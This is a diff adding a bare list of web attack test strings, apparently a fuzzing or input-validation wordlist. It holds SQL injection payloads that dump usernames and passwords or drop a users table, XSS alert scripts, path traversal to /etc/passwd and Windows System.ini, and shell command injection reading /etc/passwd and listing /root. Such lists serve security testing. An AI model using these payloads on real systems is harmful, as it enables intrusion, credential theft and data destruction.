@@ -1,0 +1,22 @@
+' OR '1'='1
+'; DROP TABLE users;
+SELECT * FROM table WHERE host = '''' UNION SELECT username, password FROM users--
+host=example.com'; exec sp_configure 'show advanced options',1--
+<script>alert('XSS')</script>
+../etc/passwd
+|| ping 127.0.0.1
+$(whoami)
+`netstat -an`
+<svg onload="alert('XSS')">
+../../../etc/passwd
+| awk '{print}'
+$(cat /etc/passwd)
+SELECT @@version
+</title><script>alert(1)</script>
+host=$(id)
+UNION SELECT 1,2,3,4--
+|| ping 1.1.1.1
+%00/etc/passwd
+hostname; whoami
+payload=../Windows/System.ini
+$(ls /root)
